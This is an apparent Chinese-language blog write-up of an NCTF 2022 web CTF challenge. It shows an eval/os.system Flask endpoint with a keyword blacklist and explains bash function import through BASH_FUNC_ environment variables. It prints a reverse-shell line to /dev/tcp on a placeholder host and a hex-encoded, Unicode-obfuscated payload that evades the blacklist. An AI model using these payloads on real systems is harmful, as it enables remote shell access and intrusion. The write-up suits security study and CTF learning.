@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>环境变量注入执行任意命令 | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="在nss上做NCTF 2022的时候发现一道很有意思的题 遂记下 源程序如下 123456789101112131415161718192021222324252627@app.route(&quot;&#x2F;calc&quot;, methods&#x3D;[&#x27;GET&#x27;])def calc():    ip &#x3D; request.remote_addr    num &#x3D; request.val">
+<meta property="og:type" content="article">
+<meta property="og:title" content="环境变量注入执行任意命令">
+<meta property="og:url" content="https://xyaxxya.github.io/posts/2da6415f.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="在nss上做NCTF 2022的时候发现一道很有意思的题 遂记下 源程序如下 123456789101112131415161718192021222324252627@app.route(&quot;&#x2F;calc&quot;, methods&#x3D;[&#x27;GET&#x27;])def calc():    ip &#x3D; request.remote_addr    num &#x3D; request.val">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dmoe.cc/random.php?2265">
+<meta property="article:published_time" content="2025-03-28T08:16:16.000Z">
+<meta property="article:modified_time" content="2025-03-29T06:46:46.151Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dmoe.cc/random.php?2265"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/posts/2da6415f.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="JKAzMndNFupeAvLybmTDZQvXJ-qzwexiresLFX-aPSw"/><meta name="msvalidate.01" content="46A43356A247D4026C1F053B84E2275F"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '环境变量注入执行任意命令',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2025-03-29 14:46:46'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?2265')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">环境变量注入执行任意命令</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-28T08:16:16.000Z" title="发表于 2025-03-28 16:16:16">2025-03-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-29T06:46:46.151Z" title="更新于 2025-03-29 14:46:46">2025-03-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">900</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/2da6415f.html" data-flag-title="环境变量注入执行任意命令"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/2da6415f.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/2da6415f.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>在nss上做NCTF 2022的时候发现一道很有意思的题</p>
+<p>遂记下</p>
+<p>源程序如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip,num)</span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里因为在log处echo了num，因此就可以传入恶意num绕过waf并通过os.system(log)命令执行</p>
+<p>很简单的测试代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">num = urllib.parse.unquote(<span class="string">&#x27;%0A%22whoami%22%0A&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;num:\n&#x27;</span>+num)</span><br><span class="line">log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">data = <span class="built_in">eval</span>(num)</span><br><span class="line">os.system(log)</span><br></pre></td></tr></table></figure>
+
+<p>在nss中去掉了num参数</p>
+<p>那么预期解如下</p>
+<p>首先看一段bash的源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (string_index = 0; <span class="built_in">env</span> &amp;&amp; (string = <span class="built_in">env</span>[string_index++]); ) &#123;</span><br><span class="line">    name = string;</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (privmode == 0 &amp;&amp; read_but_dont_execute == 0 &amp;&amp; </span><br><span class="line">        STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN) &amp;&amp;</span><br><span class="line">        STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN) &amp;&amp;</span><br><span class="line">        STREQN (<span class="string">&quot;() &#123;&quot;</span>, string, 4))</span><br><span class="line">    &#123;</span><br><span class="line">        size_t namelen;</span><br><span class="line">        char *tname;        /* desired imported <span class="keyword">function</span> name */</span><br><span class="line"></span><br><span class="line">        namelen = char_index - BASHFUNC_PREFLEN - BASHFUNC_SUFFLEN;</span><br><span class="line"></span><br><span class="line">        tname = name + BASHFUNC_PREFLEN;    /* start of func name */</span><br><span class="line">        tname[namelen] = <span class="string">&#x27;\0&#x27;</span>;      /* now tname == func name */</span><br><span class="line"></span><br><span class="line">        string_length = strlen (string);</span><br><span class="line">        temp_string = (char *)xmalloc (namelen + string_length + 2);</span><br><span class="line"></span><br><span class="line">        memcpy (temp_string, tname, namelen);</span><br><span class="line">        temp_string[namelen] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        memcpy (temp_string + namelen + 1, string, string_length + 1);</span><br><span class="line"></span><br><span class="line">        /* Don<span class="string">&#x27;t import function names that are invalid identifiers from the</span></span><br><span class="line"><span class="string">         environment in posix mode, though we still allow them to be defined as</span></span><br><span class="line"><span class="string">         shell variables. */</span></span><br><span class="line"><span class="string">        if (absolute_program (tname) == 0 &amp;&amp; (posixly_correct == 0 || legal_identifier (tname)))</span></span><br><span class="line"><span class="string">            parse_and_execute (temp_string, tname, SEVAL_NONINT|SEVAL_NOHIST|SEVAL_FUNCDEF|SEVAL_ONECMD);</span></span><br><span class="line"><span class="string">        else</span></span><br><span class="line"><span class="string">            free (temp_string);     /* parse_and_execute does this */</span></span><br><span class="line"><span class="string">        //...</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>privmode &#x3D;&#x3D; 0，即不能传入-p参数<br>read_but_dont_execute &#x3D;&#x3D; 0，即不能传入-n参数<br>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)，环境变量名前10个字符等于BASH_FUNC_<br>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)，环境变量名后两个字符等于%%<br>STREQN (“() {“, string, 4)，环境变量的值前4个字符等于() {</p>
+</blockquote>
+<p>那么构造即可通过bash执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env $‘BASH_FUNC_myfunc%%=() &#123; id; &#125;’ bash -c‘myfunc’</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell方法就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_FUNC_echo%%=() &#123;bash -i &amp;&gt; /dev/tcp/xxxxxxxxx/4444 0&gt;&amp;1&#125; </span><br><span class="line">bash -c‘echo’</span><br></pre></td></tr></table></figure>
+
+<p>那么怎么写入环境变量</p>
+<p>测试如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = 1</span></span><br><span class="line"><span class="comment"># for a in [0]:</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line"><span class="comment"># a=&#123;&quot;test&quot;:&#x27;aaaa&#x27;&#125;</span></span><br><span class="line"><span class="comment"># for(os.environ[&#x27;test&#x27;])in[&#x27;TESTTESTTEST&#x27;]:pass</span></span><br><span class="line"><span class="comment"># print(os.environ[&#x27;test&#x27;])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line"><span class="comment"># a=&#123;&quot;test&quot;:&#x27;aaaa&#x27;&#125;</span></span><br><span class="line"><span class="comment"># print([[str][0]for[os.environ[&#x27;test&#x27;]]in[[&#x27;TESTTESTTEST&#x27;]]])</span></span><br><span class="line"><span class="comment"># print(ᵒｓ.environ[&#x27;test&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\x68\x65\x6c\x6c\x6f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># print(ᵒｓ.environ[&#x27;yiyi&#x27;])</span></span><br><span class="line"><span class="built_in">print</span>([[<span class="built_in">str</span>][<span class="number">0</span>]<span class="keyword">for</span>[os.environ[<span class="string">&#x27;yiyi&#x27;</span>]]<span class="keyword">in</span>[[<span class="string">&#x27;TESTTESTTEST&#x27;</span>]]])</span><br><span class="line"><span class="built_in">print</span>(ᵒｓ.environ[<span class="string">&#x27;yiyi&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250328162408592.png" alt="image-20250328162408592"></p>
+<p>几个需要了解的点</p>
+<blockquote>
+<ul>
+<li>python的单双引号可以解析十六进制</li>
+<li>使用list生成器和中括号可以在变量覆盖的同时返回str</li>
+<li>通过这种方法可以凭空构造一个不存在的变量</li>
+</ul>
+</blockquote>
+<p>对于关键词过滤可以使用utf8非ascii字符格式绕过</p>
+<p>最终的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[str][0]for[ᵒｓ.environ[&#x27;BASH\x5fFUNC\x5fecho%%&#x27;]]in[[&#x27;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x27\x78\x27\x78\x27\x78\x27\x78\x27\x78\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31\x3b\x7d&#x27;]]]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250328162705598.png" alt="image-20250328162705598"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/posts/2da6415f.html">https://xyaxxya.github.io/posts/2da6415f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?2265" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/fc0e5af.html" title="HTB-EscapeTwo"><img class="cover" src="https://www.dmoe.cc/random.php?1611" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTB-EscapeTwo</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/34322.html" title="2024CISCN&amp;铁三初赛web"><img class="cover" src="https://www.dmoe.cc/random.php?491" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-16</div><div class="title">2024CISCN&amp;铁三初赛web</div></div></a></div><div><a href="/posts/28181.html" title="pop链构造的一些其他考点"><img class="cover" src="https://www.dmoe.cc/random.php?9892" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-05</div><div class="title">pop链构造的一些其他考点</div></div></a></div><div><a href="/posts/d6f9135a.html" title="XCTF-TPCTF"><img class="cover" src="https://www.dmoe.cc/random.php?6507" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-10</div><div class="title">XCTF-TPCTF</div></div></a></div><div><a href="/posts/53577.html" title="2025VNCTF"><img class="cover" src="https://www.dmoe.cc/random.php?5161" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-10</div><div class="title">2025VNCTF</div></div></a></div><div><a href="/posts/d64ee7.html" title="Java反序列化之URLDNS链分析"><img class="cover" src="https://www.dmoe.cc/random.php?4153" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-19</div><div class="title">Java反序列化之URLDNS链分析</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/2da6415f.html" title="环境变量注入执行任意命令"><img src="https://www.dmoe.cc/random.php?2265" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="环境变量注入执行任意命令"/></a><div class="content"><a class="title" href="/posts/2da6415f.html" title="环境变量注入执行任意命令">环境变量注入执行任意命令</a><time datetime="2025-03-28T08:16:16.000Z" title="发表于 2025-03-28 16:16:16">2025-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fc0e5af.html" title="HTB-EscapeTwo"><img src="https://www.dmoe.cc/random.php?1611" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-EscapeTwo"/></a><div class="content"><a class="title" href="/posts/fc0e5af.html" 